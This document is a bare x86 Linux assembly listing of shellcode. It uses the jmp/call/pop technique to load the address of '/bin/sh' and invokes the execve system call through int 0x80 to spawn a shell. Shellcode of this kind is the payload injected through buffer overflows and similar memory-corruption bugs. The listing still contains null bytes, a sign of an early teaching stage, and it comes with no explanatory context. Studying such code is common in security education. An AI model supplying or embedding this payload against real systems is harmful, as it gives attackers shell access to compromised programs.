.section .text
.global _start

_start:
  jmp end
begin:
  popl %esi

  movl $0xb, %eax # sys_execve()
  movl %esi, %ebx # char *filename
  movl $0x0, %ecx # char *argv[]
  movl $0x0, %edx # char *envp[]
  int $0x80

end:
  call begin

path:
.ascii "/bin/sh\000"